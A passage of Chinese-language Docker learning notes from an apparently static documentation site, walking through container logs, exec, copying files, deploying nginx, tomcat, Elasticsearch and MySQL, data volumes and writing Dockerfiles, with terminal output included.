    exited (0) 8 hours ago                          fervent_mirzakhani\n\n\n\n# 查看日志\n\ndocker logs\ndocker logs -f -t --tail n 【id】\n\n\n\n\n\n[root@192 ~]# docker logs --help\n\nusage:\tdocker logs [options] container\n\nfetch the logs of a container\n\noptions:\n      --details        show extra details provided to logs\n  -f, --follow         follow log output\n      --since string   show logs since timestamp (e.g.\n                       2013-01-02t13:23:37) or relative\n                       (e.g. 42m for 42 minutes)\n      --tail string    number of lines to show from the\n                       end of the logs (default "all")\n  -t, --timestamps     show timestamps # 时间戳\n      --until string   show logs before a timestamp (e.g.\n                       2013-01-02t13:23:37) or relative\n                       (e.g. 42m for 42 minutes)\n\n\n\nwhiel true;do echo shenzai;sleep \n\n\n# 运行一个\n[root@192 ~]# docker run -it centos /bin/bash\n\n[root@c2887d35c71d /]# [root@192 ~]# docker ps\ncontainer id        image               command             created             status              ports               names\nc2887d35c71d        centos              "/bin/bash"         57 seconds ago      up 56 seconds                           vigorous_kare\n\n# 查看日志，由于没有运行脚本，所以啥也没显示\n[root@192 ~]# docker logs -f -t --tail 10 c2887d35c71d\n^c # ctrl+c退出\n\n# 运行centos里面加个脚本\n[root@192 ~]# docker run -d centos /bin/sh -c "while true;do echo shenzai;sleep 1;done"\ncb6d7fbc3f27a064137d58282de97b97365dea2705211ebfbad642079cc1b388\n\n[root@192 ~]# docker ps\ncontainer id        image               command                  created             status              ports               names\ncb6d7fbc3f27        centos              "/bin/sh -c \'while t…"   7 seconds ago       up 6 seconds                            dreamy_almeida\nc2887d35c71d        centos              "/bin/bash"              3 minutes ago       up 3 minutes                            vigorous_kare\n\n# 查看日志 发现隔一秒打印一条\n[root@192 ~]# docker logs -f -t --tail 10 cb6d7fbc3f27\n2020-06-17t12:02:11.293765084z shenzai\n2020-06-17t12:02:12.297675608z shenzai\n2020-06-17t12:02:13.301845582z shenzai\n2020-06-17t12:02:14.304800996z shenzai\n2020-06-17t12:02:15.307130238z shenzai\n2020-06-17t12:02:16.310574235z shenzai\n2020-06-17t12:02:17.312946923z shenzai\n2020-06-17t12:02:18.314841295z shenzai\n2020-06-17t12:02:19.317021705z shenzai\n2020-06-17t12:02:20.319670013z shenzai\n2020-06-17t12:02:21.322651649z shenzai\n2020-06-17t12:02:22.325466918z shenzai\n2020-06-17t12:02:23.327984704z shenzai\n2020-06-17t12:02:24.329656919z shenzai\n\n\n\n# 查看正在运行的容器信息\n\n[root@192 ~]# docker inspect cb6d7fbc3f27\n[\n    {\n        # 容器的完整id\n        "id": "cb6d7fbc3f27a064137d58282de97b97365dea2705211ebfbad642079cc1b388",\n        \n        # 创建时间\n        "created": "2020-06-17t12:00:50.706906186z",\n        \n        # 脚本位置\n        "path": "/bin/sh",\n        \n        # 运行的脚本\n        "args": [\n            "-c",\n            "while true;do echo shenzai;sleep 1;done"\n        ],\n        "state": {\n            "status": "running", # 状态，正在运行\n            "running": true,\n            "paused": false,\n            "restarting": false,\n            "oomkilled": false,\n            "dead": false,\n            "pid": 1909, # 父进程id\n            "exitcode": 0,\n            "error": "",\n            "startedat": "2020-06-17t12:00:51.093617477z",\n            "finishedat": "0001-01-01t00:00:00z"\n        },\n        \n        # 来源镜像\n        "image": "sha256:831691599b88ad6cc2a4abbd0e89661a121aff14cfa289ad840fd3946f274f1f",\n        "resolvconfpath": "/var/lib/docker/containers/cb6d7fbc3f27a064137d58282de97b97365dea2705211ebfbad642079cc1b388/resolv.conf",\n        "hostnamepath": "/var/lib/docker/containers/cb6d7fbc3f27a064137d58282de97b97365dea2705211ebfbad642079cc1b388/hostname",\n        "hostspath": "/var/lib/docker/containers/cb6d7fbc3f27a064137d58282de97b97365dea2705211ebfbad642079cc1b388/hosts",\n        "logpath": "/var/lib/docker/containers/cb6d7fbc3f27a064137d58282de97b97365dea2705211ebfbad642079cc1b388/cb6d7fbc3f27a064137d58282de97b97365dea2705211ebfbad642079cc1b388-json.log",\n        \n        \n        "name": "/dreamy_almeida",\n        "restartcount": 0,\n        "driver": "overlay2",\n        "platform": "linux",\n        "mountlabel": "",\n        "processlabel": "",\n        "apparmorprofile": "",\n        "execids": null,\n        \n        # 主机配置\n        "hostconfig": {\n            "binds": null,\n            "containeridfile": "",\n            "logconfig": {\n                "type": "json-file",\n                "config": {}\n            },\n            "networkmode": "default",\n            "portbindings": {},\n            "restartpolicy": {\n                "name": "no",\n                "maximumretrycount": 0\n            },\n            "autoremove": false,\n            "volumedriver": "",\n            "volumesfrom": null,\n            "capadd": null,\n            "capdrop": null,\n            "capabilities": null,\n            "dns": [],\n            "dnsoptions": [],\n            "dnssearch": [],\n            "extrahosts": null,\n            "groupadd": null,\n            "ipcmode": "private",\n            "cgroup": "",\n            "links": null,\n            "oomscoreadj": 0,\n            "pidmode": "",\n            "privileged": false,\n            "publishallports": false,\n            "readonlyrootfs": false,\n            "securityopt": null,\n            "utsmode": "",\n            "usernsmode": "",\n            "shmsize": 67108864,\n            "runtime": "runc",\n            "consolesize": [\n                0,\n                0\n            ],\n            "isolation": "",\n            "cpushares": 0,\n            "memory": 0,\n            "nanocpus": 0,\n            "cgroupparent": "",\n            "blkioweight": 0,\n            "blkioweightdevice": [],\n            "blkiodevicereadbps": null,\n            "blkiodevicewritebps": null,\n            "blkiodevicereadiops": null,\n            "blkiodevicewriteiops": null,\n            "cpuperiod": 0,\n            "cpuquota": 0,\n            "cpurealtimeperiod": 0,\n            "cpurealtimeruntime": 0,\n            "cpusetcpus": "",\n            "cpusetmems": "",\n            "devices": [],\n            "devicecgrouprules": null,\n            "devicerequests": null,\n            "kernelmemory": 0,\n            "kernelmemorytcp": 0,\n            "memoryreservation": 0,\n            "memoryswap": 0,\n            "memoryswappiness": null,\n            "oomkilldisable": false,\n            "pidslimit": null,\n            "ulimits": null,\n            "cpucount": 0,\n            "cpupercent": 0,\n            "iomaximumiops": 0,\n            "iomaximumbandwidth": 0,\n            "maskedpaths": [\n                "/proc/asound",\n                "/proc/acpi",\n                "/proc/kcore",\n                "/proc/keys",\n                "/proc/latency_stats",\n                "/proc/timer_list",\n                "/proc/timer_stats",\n                "/proc/sched_debug",\n                "/proc/scsi",\n                "/sys/firmware"\n            ],\n            "readonlypaths": [\n                "/proc/bus",\n                "/proc/fs",\n                "/proc/irq",\n                "/proc/sys",\n                "/proc/sysrq-trigger"\n            ]\n        },\n        \n        # 其他配置\n        "graphdriver": {\n            "data": {\n                "lowerdir": "/var/lib/docker/overlay2/3675586ebbd79cd72d2562a90c9380627a331c563724c0dac091f92600af4907-init/diff:/var/lib/docker/overlay2/7f79322e0f58d651a84a555dadd83d92537788172525945d3f538dd95dce336c/diff",\n                "mergeddir": "/var/lib/docker/overlay2/3675586ebbd79cd72d2562a90c9380627a331c563724c0dac091f92600af4907/merged",\n                "upperdir": "/var/lib/docker/overlay2/3675586ebbd79cd72d2562a90c9380627a331c563724c0dac091f92600af4907/diff",\n                "workdir": "/var/lib/docker/overlay2/3675586ebbd79cd72d2562a90c9380627a331c563724c0dac091f92600af4907/work"\n            },\n            "name": "overlay2"\n        },\n        \n        "mounts": [], # 挂载\n        \n        # 基本配置\n        "config": {\n            "hostname": "cb6d7fbc3f27",\n            "domainname": "",\n            "user": "",\n            "attachstdin": false,\n            "attachstdout": false,\n            "attachstderr": false,\n            "tty": false,\n            "openstdin": false,\n            "stdinonce": false,\n            "env": [\n                "path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"\n            ], # 基本环境变量，这里没有java\n            \n            # 基本命令\n            "cmd": [\n                "/bin/sh",\n                "-c",\n                "while true;do echo shenzai;sleep 1;done"\n            ],\n            "image": "centos",\n            "volumes": null,\n            "workingdir": "",\n            "entrypoint": null,\n            "onbuild": null,\n            "labels": {\n                "org.label-schema.build-date": "20200611",\n                "org.label-schema.license": "gplv2",\n                "org.label-schema.name": "centos base image",\n                "org.label-schema.schema-version": "1.0",\n                "org.label-schema.vendor": "centos"\n            }\n        },\n        \n        # 网卡，比如现在用的是桥接的网卡\n        "networksettings": {\n            "bridge": "",\n            "sandboxid": "4d701985d7e77aa153790b697b2f38a61e20555c224b7675e4bf650b82799882",\n            "hairpinmode": false,\n            "linklocalipv6address": "",\n            "linklocalipv6prefixlen": 0,\n            "ports": {},\n            "sandboxkey": "/var/run/docker/netns/4d701985d7e7",\n            "secondaryipaddresses": null,\n            "secondaryipv6addresses": null,\n            "endpointid": "8a6c71e2bafb19ca7dfd85445ccc4bef6d17467360a243d624089e676a24a018",\n            "gateway": "172.17.0.1",\n            "globalipv6address": "",\n            "globalipv6prefixlen": 0,\n            "ipaddress": "172.17.0.3",\n            "ipprefixlen": 16,\n            "ipv6gateway": "",\n            "macaddress": "02:42:ac:11:00:03",\n            "networks": {\n                "bridge": {\n                    "ipamconfig": null,\n                    "links": null,\n                    "aliases": null,\n                    "networkid": "22b0fd2290ccbc4e066a75d3f01bd8bf32ee4352c5bbcfc9f911287219219571",\n                    "endpointid": "8a6c71e2bafb19ca7dfd85445ccc4bef6d17467360a243d624089e676a24a018",\n                    "gateway": "172.17.0.1",\n                    "ipaddress": "172.17.0.3",\n                    "ipprefixlen": 16,\n                    "ipv6gateway": "",\n                    "globalipv6address": "",\n                    "globalipv6prefixlen": 0,\n                    "macaddress": "02:42:ac:11:00:03",\n                    "driveropts": null\n                }\n            }\n        }\n    }\n]\n\n\n\n# 停止正在疯狂输出的那个容器\n[root@192 ~]# docker stop cb6d7fbc3f27\ncb6d7fbc3f27\n\n\n# 进入当前正在运行的容器\n\n# 我们通常容器都是使用后台方式运行的e\n\ndocker exec -it 容器id bashbash\n\n# 测试\n[root@192 ~]# docker ps\ncontainer id        image               command             created             status              ports               names\nc2887d35c71d        centos              "/bin/bash"         35 minutes ago      up 35 minutes                           vigorous_kare\n[root@192 ~]# docker exec -it c2887d35c71d /bin/bash\n[root@c2887d35c71d /]# ls\nbin  etc   lib\t  lost+found  mnt  proc  run   srv  tmp  var\ndev  home  lib64  media       opt  root  sbin  sys  usr\n[root@c2887d35c71d /]# ps -ef\nuid         pid   ppid  c stime tty          time cmd\nroot          1      0  0 11:57 pts/0    00:00:00 /bin/bash\nroot         14      0  0 12:32 pts/1    00:00:00 /bin/bash\nroot         28     14  0 12:32 pts/1    00:00:00 ps -ef\n[root@c2887d35c71d /]# c2887d35c71d\n[root@c2887d35c71d /]# exit\nexit\n\n# 方式二\n[root@192 ~]# docker attach c2887d35c71d\n[root@c2887d35c71d /]# \n\n# 区别\n# docker exec # 进入容器后开启一个新的终端，可以在里面操作(常用)\n# docker attach 进入容器正在执行的终端，不会启动新的进程\n\n\n\n# 从容器内拷贝文件到主机上\n\n# 运行\n[root@192 ~]# docker run -it centos\n# ctrl p q 不关闭退出，查看\n[root@0569081aa89c /]# [root@192 ~]# docker ps\ncontainer id        image               command             created             status              ports               names\n0569081aa89c        centos              "/bin/bash"         19 seconds ago      up 19 seconds    \nhopeful_chebyshev\n\n# 查看主机home下无文件\n[root@192 ~]# cd /home\n[root@192 home]# ls\n\n# 进入正在运行的容器\n[root@192 home]# docker attach 0569081aa89c\n\n# 进入容器home目录\n[root@0569081aa89c /]# cd /home\n\n# 在目录中创建java文件\n[root@0569081aa89c home]# touch test.java\n\n# 退出并停止容器\n[root@0569081aa89c home]# exit\nexit\n\n# 查看现在运行的容器\n[root@192 home]# docker ps\ncontainer id        image               command             created             status              ports               names\n\n# 容器虽然被停止，但是数据都会保留\n[root@192 home]# docker ps -a\ncontainer id        image               command                  created             status                         ports               names\n0569081aa89c        centos              "/bin/bash"              3 minutes ago       exited (0) 8 seconds ago                           hopeful_chebyshev\nf589e5684a01        centos              "/bin/bash"              44 minutes ago      exited (0) 44 minutes ago                          cranky_easley\ncb6d7fbc3f27        centos              "/bin/sh -c \'while t…"   54 minutes ago      exited (137) 42 minutes ago                        dreamy_almeida\nc2887d35c71d        centos              "/bin/bash"              58 minutes ago      exited (127) 16 minutes ago                        vigorous_kare\n8ce188e5fee3        centos              "/bin/bash"              about an hour ago   exited (0) about an hour ago                       tender_dirac\n7b1a7dd10ea4        centos              "/bin/bash"              9 hours ago         exited (0) 9 hours ago                             fervent_mirzakhani\n\n# 容器数据拷贝到主机\n[root@192 home]# docker cp 0569081aa89c:/home/test.java /home\n[root@192 home]# ls\ntest.java\n\n# 拷贝是一个手动过程，未来我们使用 -v 卷的技术，可以实现自动同步 /home /home\n\n\n# 查看内容占用\n\ndocker stats\n\n\n\n# 小结\n\n\n\n[root@192 home]# docker --help\n\nusage:\tdocker [options] command\n\na self-sufficient runtime for containers\n\noptions:\n      --config string      location of client config\n                           files (default "/root/.docker")\n  -c, --context string     name of the context to use to\n                           connect to the daemon\n                           (overrides docker_host env var\n                           and default context set with\n                           "docker context use")\n  -d, --debug              enable debug mode\n  -h, --host list          daemon socket(s) to connect to\n  -l, --log-level string   set the logging level\n                           ("debug"|"info"|"warn"|"error"|"fatal") (default "info")\n      --tls                use tls; implied by --tlsverify\n      --tlscacert string   trust certs signed only by\n                           this ca (default\n                           "/root/.docker/ca.pem")\n      --tlscert string     path to tls certificate file\n                           (default "/root/.docker/cert.pem")\n      --tlskey string      path to tls key file (default\n                           "/root/.docker/key.pem")\n      --tlsverify          use tls and verify the remote\n  -v, --version            print version information and quit\n\nmanagement commands:\n  builder     manage builds\n  config      manage docker configs\n  container   manage containers\n  context     manage contexts\n  engine      manage the docker engine\n  image       manage images\n  network     manage networks\n  node        manage swarm nodes\n  plugin      manage plugins\n  secret      manage docker secrets\n  service     manage services\n  stack       manage docker stacks\n  swarm       manage swarm\n  system      manage docker\n  trust       manage trust on docker images\n  volume      manage volumes\n\ncommands:\n  attach      attach local standard input, output, and error streams to a running container\n  build       build an image from a dockerfile\n  commit      create a new image from a container\'s changes\n  cp          copy files/folders between a container and the local filesystem\n  create      create a new container\n  diff        inspect changes to files or directories on a container\'s filesystem\n  events      get real time events from the server\n  exec        run a command in a running container\n  export      export a container\'s filesystem as a tar archive\n  history     show the history of an image\n  images      list images\n  import      import the contents from a tarball to create a filesystem image\n  info        display system-wide information\n  inspect     return low-level information on docker objects\n  kill        kill one or more running containers\n  load        load an image from a tar archive or stdin\n  login       log in to a docker registry\n  logout      log out from a docker registry\n  logs        fetch the logs of a container\n  pause       pause all processes within one or more containers\n  port        list port mappings or a specific mapping for the container\n  ps          list containers\n  pull        pull an image or a repository from a registry\n  push        push an image or a repository to a registry\n  rename      rename a container\n  restart     restart one or more containers\n  rm          remove one or more containers\n  rmi         remove one or more images\n  run         run a command in a new container\n  save        save one or more images to a tar archive (streamed to stdout by default)\n  search      search the docker hub for images\n  start       start one or more stopped containers\n  stats       display a live stream of container(s) resource usage statistics\n  stop        stop one or more running containers\n  tag         create a tag target_image that refers to source_image\n  top         display the running processes of a container\n  unpause     unpause all processes within one or more containers\n  update      update configuration of one or more containers\n  version     show the docker version information\n  wait        block until one or more containers stop, then print their exit codes\n\n\n\n\n\n\n\n\n\n# 作业练习\n\n# 部署nginx\n\n\n\n# 官网搜索nginx，可以看到帮助文档\n\n# 下载镜像\n[root@192 home]# docker pull nginx\nusing default tag: latest\nlatest: pulling from library/nginx\n8559a31e96f4: pull complete \n8d69e59170f7: pull complete \n3f9f1ec1d262: pull complete \nd1f5ff4f210d: pull complete \n1e22bfa8652e: pull complete \ndigest: sha256:21f32f6c08406306d822a0e6e8b7dc81f53f336570e852e25fbe1e3e3d0d0133\nstatus: downloaded newer image for nginx:latest\ndocker.io/library/nginx:latest\n\n# 查看镜像\n[root@192 home]# docker images\nrepository          tag                 image id            created             size\ncentos              latest              831691599b88        13 hours ago        215mb\nnginx               latest              2622e6cca7eb        7 days ago          132mb\n\n# 运行测试\n# -d 后台运行，--name 命名，-p 暴露端口，3344服务器、宿主机的端口，容器内部端口\n[root@192 home]# docker run -d --name nginx01 -p:3344:80 nginx\n38dbf7bdcaef232d269b7184d91e44e06087181b5ee929494e177ad526810fa8\n[root@192 home]# docker ps\ncontainer id        image               command                  created             status              ports                  names\n38dbf7bdcaef        nginx               "/docker-entrypoint.…"   7 seconds ago       up 6 seconds        0.0.0.0:3344->80/tcp   nginx01\n\n# 使用3344可以访问成功\n[root@192 home]# curl localhost:3344\n<!doctype html>\n<html>\n<head>\n<title>welcome to nginx!</title>\n<style>\n    body {\n        width: 35em;\n        margin: 0 auto;\n        font-family: tahoma, verdana, arial, sans-serif;\n    }\n</style>\n</head>\n<body>\n<h1>welcome to nginx!</h1>\n<p>if you see this page, the nginx web server is successfully installed and\nworking. further configuration is required.</p>\n\n<p>for online documentation and support please refer to\n<a href="http://nginx.org/">nginx.org</a>.<br/>\ncommercial support is available at\n<a href="http://nginx.com/">nginx.com</a>.</p>\n\n<p><em>thank you for using nginx.</em></p>\n</body>\n</html>\n\n\n\n端口暴露\n\n\n\n可以公网访问\n\n找到服务器地址\n\n\n\n浏览器输入 192.168.147.132:3344/\n\n\n\n[root@192 home]# docker ps\ncontainer id        image               command                  created             status              ports                  names\n38dbf7bdcaef        nginx               "/docker-entrypoint.…"   21 minutes ago      up 21 minutes       0.0.0.0:3344->80/tcp   nginx01\n\n# 进入容器\n[root@192 home]# docker exec -it nginx01 /bin/bash\n\n# 查一下nginx在哪\nroot@38dbf7bdcaef:/# whereis nginx\nnginx: /usr/sbin/nginx /usr/lib/nginx /etc/nginx /usr/share/nginx\n\n# 到这个目录\nroot@38dbf7bdcaef:/# cd /etc/nginx\nroot@38dbf7bdcaef:/etc/nginx# ls\nconf.d\t\tkoi-utf  mime.types  nginx.conf   uwsgi_params\nfastcgi_params\tkoi-win  modules     scgi_params  win-utf\n\n# 退出\nroot@38dbf7bdcaef:/etc/nginx# exit\nexit\n\n# 停止\n[root@192 home]# docker stop 38dbf7bdcaef\n38dbf7bdcaef\n\n\n\n\n再次刷新网页，服务关闭\n\n思考问题：每次改动nginx配置文件，都需要进入容器内部，十分麻烦，要是可以在容器外部提供一个映射路径，达到在容器修改文件名，容器内部就可以自动修改？-v 数据卷技术！\n\n# 部署tomcat\n\n\n\n在docker hub上查看版本号和使用方法\n\n\n\n官方文档一定要翻烂，超多版本，我的天呐~\n\n# 官方方法\n\ndocker run -it --rm tomcat:9.0\n\n# docker run 可以不用pull，能自动下载\n# -it 直接进去运行\n# --rm 是什么意思？入门的意思？\n# 我们之前的启动都是后台，停止了容器之后，容器还是可以查到\n# 写了--rm，类似阅后即焚模式，用完即删除，这种通常用来测试\n\n# 最后冒号查好的版本号\n\n\n\n\n\n\nctrl+c退出\n\ndocker ps -a\n\n\n\n\n可以看到并没有tomcat，印证阅后即焚模式，容器会删除，镜像不会删除\n\n平时不建议这样搞\n\n# 正常方法\n\ndocker pull tomcat:9.0 # 之前下过了，应该不用下了，这里老师讲错了\n\n\n\n\n# 启动运行，应该加上版本号\ndocker run -d -p 3355:8080 --name tomcat01 tomcat\n\n\n\n\n# 进入容器\ndocker exec -it tomcat01 /bin/bash\n\n\n\n\n发现问题\n\n 1. linux命令少了\n 2. 没有webapps\n\n\n\n这是阿里云镜像的原因：默认使用最小镜像，所有不必要的都剔除了，保证最小可运行环境\n\n\n\n再次找到结构\n\n\n\n在浏览器中输入：http://192.168.147.132:3355/\n\n\n\n思考问题：我们以后部署项目，如果每次都要进入容器是不是身份麻烦？我要是可以在容器外部提供一个映射路径，webapps，我们在外部放置项目，就自动同步到内部就好了！\n\ndocker容器 tomcat+网站\n\ndocker mysql\n\n# 部署es+kibana\n\n\n\n# es 暴露的端口很多\n# es 十分耗内存\n# es 的数据一般需要放置到安全目录！挂载\n\n# 启动 elasticsearch\n$ docker run -d --name elasticsearch01 -p 9200:9200 -p 9300:9300 -e "discovery.type=single-node" elasticsearch:7.6.2\n\n# 查看内存占用情况\ndocker stats\n\n\n\n\n# 先感觉stop一下\ndocker stop ba18713ca536\n\n\n\n\n# 通过 -e 限制内存\n$ docker run -d --name elasticsearch02 -p 9200:9200 -p 9300:9300 -e "discovery.type=single-node" -e es_java_opts=“-xms64m -xmx512m” elasticsearch:7.6.2\n\n\n\n\n没成功啊，sei能告诉我为啥！！\n\ndocker run -d --name elasticsearch02 -p 9200:9200 -p 9300:9300 -e "discovery.type=single-node" -e es_java_opts="-xms64m -xmx512m" elasticsearch:7.6.2\n\n\n> py0003null大佬: “es_java_opts=-xms64m -xmx512m”\n> \n> py0003null大佬: 引号提前试试\n\n原因是引号！！你没觉得怪怪的嘛\n\n\n\n此时查看stats，发现内存占用在控制范围内\n\n\n\nctrl + c退出，记得stop\n\n\n\n# 思考：用kibana链接elasticsearch\n\n\n\n\n# 可视化\n\n * portainer(先用这个)\n * rancher(ci/cd时用)\n\n# portainer\n\ndocker图像化界面管理工具，提供一个后台面板供我们操作！\n\ndocker run -d -p 8088:9000 --restart=always -v /var/run/docker.sock:/var/run/docker --privileged=true portainer/portainer\n\n\n\n\n访问外网8088\n\n\n\n用户名\n\n密码\n\n\n\n【中午吃饭重连了一下，失败，不知道发生了啥】\n\n\n\n\n\n【平时不会用这个，好吧，先往下】\n\n\n#\n\n\n# docker镜像\n\n\n# 原理\n\nunionfs 联合文件系统\n\n\n\nbootfs：boot file system\n\nrootfs：root file system\n\n\n\n\n\n\n\n\n\ndocker镜像都是只读的，当容器启动时，一个新的可写层被加到镜像的顶部，这一层就是我们通常说的容器层，容器层之下的都叫镜像层\n\n\n\n\n# commit提交镜像\n\ndocker commit # 提交容器成为一个新的副本\ndocker commit -m="提交的描述信息" -a="作者" 容器id 目标镜像名：[tag]\n\n\ndocker images\ndocker run -it -p 8080:8080 tomcat\n\n\n\n\n这是一个前台程序\n\n\n\n将webapps.dist里面所有的文件拷贝到webapps里面，其中-r必须有，表示目录递归拷贝\n\n\n\n\n\ndocker commit -a="paidaxing" -m="add webapps app" 当前容器的id tomcat02:1.0\n\n\n\n\n发现新的版本，比之前的大了一些，因为里面记录了我们的改动\n\n> 如果想保存当前容器的状态，可以通过commit提交，获得一个镜像\n> \n> 好比我们以前学习vm的时候的快照\n> \n> 到这里算是入门了\n> \n> 接下来三个部分是docker的精髓\n\n\n# 容器数据卷\n\n\n# 什么是容器卷\n\ndocker是要将应用和环境打包成一个镜像\n\n这样，数据就不应该在容器中，否则容器删除，数据就会丢失，这就是删库跑路\n\n故容器之间要有一个数据共享技术\n\n在docker容器中产生的数据，同步到本地，这就是卷技术\n\n本质上是一个目录挂载，将容器内的目录挂载到虚拟机上\n\n\n\n目的：容器的持久化和同步操作\n\n容器间可以数据共享\n\n\n# 使用数据卷\n\n方式一：直接使用命令来挂载\n\ndocker run -it -v -p\n# -it 交互式进入\n# -v volume卷技术\n# -p 主机端口\n\n\n\n\n新开一个窗口\n\ndocker inspect 容器id\n\n\n\n\n找到挂载信息mounts\n\n\n\n测试\n\n\n\n容器停止后，修改主机文件，再启动容器的时候，数据同样改变\n\n双向同步\n\n\n# 实战安装mysql\n\nmysql的数据持久化命令\n\ndocker search mysql\n\n# 拉取\ndocker pull mysql:5.7\n\n# 挂载\ndocker run -d -p 3310:3306 -v /home/mysql/conf:/etc/mysql/conf.d -v /home/mysql/data:/var/lib/mysql -e mysql_root_password=123456 --name mysql01 mysql5.7\n\n-d 后台运行\n-p 端口映射\n-v 卷挂载\n-e 环境配置 安装启动mysql需要配置密码\n--name 容器名字\n\n\n\n\n\n链接测试：打开sqlyog\n\n\n\n点 测试链接\n\n\n\n点 链接\n\n\n\n\n# 具名和匿名挂载\n\n\n\n\n\n\n#\n\ndockerfile使用来构建docker镜像的文件\n\n\n\n> kas: 没有安装吧？\n> \n> kas: 安装一下就可以了\n> \n> py9001021曾叙坚: centos 默认使用vi写内容，vim需要下载\n> \n> py9001021曾叙坚: 是的，需要下载vim才能使用\n> \n> yf: 配置可以改下，字体就很炫酷了\n> \n> 都建民: 用vi 试试\n> \n> 都建民: 你没有安装vim\n> \n> 都建民: yum install vim\n> \n> 都建民: 试试这个命令\n\nyum install vim # 编辑文件的，没有装一下\n\n\n\n\n安装完之后就可以运行这个命令了\n\n\n\n# 镜像是一层一层的，脚本是一行一行的\n# 指令都是大写的\n# 这里的每个命令可以理解为镜像的一层\n\nfrom centos\n\nvolume ["volume01","volume02"] # 再创建镜像的时候就挂载出来\n\ncmd echo "---end---"\ncmd /bin/bash\n\n\n\n\n\n想保存并退出\n\n> wesley.: shift 加 冒号\n\n\n\ncat dockerfile1\n\ndocker build -f dockerfile1 -t padaxing/centos:1.0 .  # 最后的点很重要 镜像名不能有/\n\n\n\n\ndocker images\n\n\n\n\n启动生成的镜像\n\n\n\n在容器内部创建一个文件\n\n\n\n查看mounts，source对应容器外目录，匿名挂载卷\n\n\n\n测试一下，在container volume01下生成文件\n\n\n\n在主机挂载路径下，也同样生成\n\n\n# 多个容器数据共享\n\n\n\n看一下有啥images\n\n\n\n启动docker01，用之前建的padaxing/centos 1.0 镜像\n\ndocker run -it --name docker01 padaxing/centos:1.0 # 1.0必须写\n\n\n\n\n当前这个ctrl+p+q不停止退出\n\n\n\n依次启动docker02、docker03\n\ndocker run -it --name docker02 --volumes-from docker01 padaxing/centos:1.0\n\n\ndocker02继承docker01的volumes\n\n可以验证，在docker01下加一个数据，在docker02下也会出现\n\n\n\n创建docker03，同样继承docker01\n\ndocker run -it --name docker03 --volumes-from docker01 padaxing/centos:1.0\n\n\n\n\n在docker03的volume01下建立文件，在docker01的volume01下同样也有\n\n即通过--volumes-from 可以实现不同容器间的数据共享\n\n删除docker01，数据还在\n\ndocker rm -f \n\n\n\n\n可以看到，删除docker01，进入docker02，数据依然在\n\n结论：\n\n容器之间配置信息的传递，数据卷容器的生命周期一直持续到没有容器使用位置\n\n但是如果持久化到了本地，即使所有容器删除了，本地数据是不会删除的\n\n----------------------------------------\n\n\n# dockerfile\n\n是用来构建docker镜像的文件，可以理解为命令参数脚本\n\n构建步骤：\n\n 1. 编写一个dockerfile文件\n 2. docker build 构建成为一个镜像\n 3. docker run运行镜像\n 4. docker push 发布镜像（dockerhub、阿里云镜像仓库 私有/共有）\n\n这个写一个项目时一样的\n\n\n# 官方dockerfile示例\n\n看一下官方的dockerfile\n\n\n\n可以看到官方镜像都是基础包，很多功能没有，我们通常会自己搭建自己的镜像\n\n官方既然可以制作镜像，我们亦可以\n\n----------------------------------------\n\n\n# dockerfile基础知识\n\n 1. 每个指令都必须是大写字母\n 2. 按照从上到下顺序执行\n 3. *#*表示注释\n 4. 每一个指令都会创建体检一个新的镜像层，并提交\n\n\n\ndocker是面向开发的，我们以后要发布项目，做镜像，就要编写dockerfile文件，这个文件十分简单！\n\ndocker镜像逐渐成为企业的交付标准，必须掌握！\n\n----------------------------------------\n\n\n# dockerfile命令\n\n\n\n\n#\n\nfrom # 基础镜像 比如centos\nmaintainer # 镜像是谁写的 姓名+邮箱\nrun # 镜像构建时需要运行的命令\nadd # 添加，比如添加一个tomcat压缩包\nworkdir # 镜像的工作目录\nvolume # 挂载的目录\nexpose # 指定暴露端口，跟-p一个道理\nrun # 最终要运行的\ncmd # 指定这个容器启动的时候要运行的命令，只有最后一个会生效，而且可被替代\nentrypoint # 指定这个容器启动的时候要运行的命令，可以追加命令\nonbuild # 当构建一个被继承dockerfile 这个时候运行onbuild指定，触发指令\ncopy # 将文件拷贝到镜像中\nenv # 构建的时候设置环境变量\n\n\n\n# 实战构建自己的centos\n\ndocker hub中99%的镜像都是从from scratch开始的\n\n添加centos7的压缩包\n\n# 创建一个自己的centos\n\n# 进入home目录\ncd /home\n\n# 创建一个目录，之后的东西都保存到这里\nmkdir dockerfile\n# 进入这个目录\ncd dockerfile/\n# 创建一个dockerfile，名字叫mydockerfile\nvim mydockerfile-centos\n\n\n\n\nxbash新开一个界面\n\n# 官方默认centos\ndocker run -it centos\npwd # 官方默认有pwd命令\nvim # 官方默认没有vim命令\nifconfig # 官方默认没有ifconfig命令\n\n\n\n\n回到mydockerfile\n\n\n\n# 下面给官方centos加上自定义的内容\nfrom centos\nmaintainer padaxing<010301200@hai.com>\n\nenv mypath /usr/local\nworkdir $mypath\n\nrun yum -y install vim\nrun yum -y install net-tools\n\nexpose 80\n\ncmd echo $mypath\ncmd echo "---end---"\ncmd /bin/bash\n\n\n\n\nesc, shif + : 输入wq保存并退出\n\n如果写错了需要修改、\n\nvim mydockerfile-centos\n# 进入之后按i或者insert键即可修改\n\n\n下面通过这个这个文件创建镜像\n\ndocker build -f dockerfile-centos -t mycentos:0.1 .\n\n\n\n\n依次执行命令\n\n\n\n最终返回successfully表示成功\n\n\n\ndocker run -it mycentos:0.1 # 版本号必须写，不然他会去找最新的\npwd\nvim\nifconfig\n\n\n\n\n这时可以看到这些功能都有了\n\n可以通过查看docker构建历史\n\n\n\n可以看到当前这个镜像是怎么一步一步构建起来的\n\n我们平时拿到一个镜像也可以通过这个方法研究一下他是怎么做的\n\n\n# cmd与entrypoint\n\n\nfrom centos\ncmd ["ls","-a"] # 启动centos展示目录\n\n\n\n\n测试entrypoint\n\n\n\nrun的时候可以直接加命令\n\n\n\ndocker中许多命令都十分相似，我们需要了解他们的区别，最好的方式就是这样对比测试\n\n----------------------------------------',charsets:{cjk:!0}},{title:"history 对象",frontmatter:{},regularPath:"/Javascript/JavaScriptBOM%E6%93%8D%E4%BD%9C/history%E5%AF%B9%E8%B1%A1.html",relativePath:"Javascript/JavaScriptBOM操作/history对象.md",key:"v-001ebd09",path:"/Javascript/JavaScriptBOM%E6%93%8D%E4%BD%9C/history%E5%AF%B9%E8%B1%A1.html",headers:[{level:2,title:"history 对象",slug:"history-对象",normalizedTitle:"history 对象",charIndex:2},{level:3,title:"history 对象属性",slug:"history-对象属性",normalizedTitle:"history 对象属性",charIndex:203},{level:3,title:"history 对象方法",slug:"history-对象方法",normalizedTitle:"history 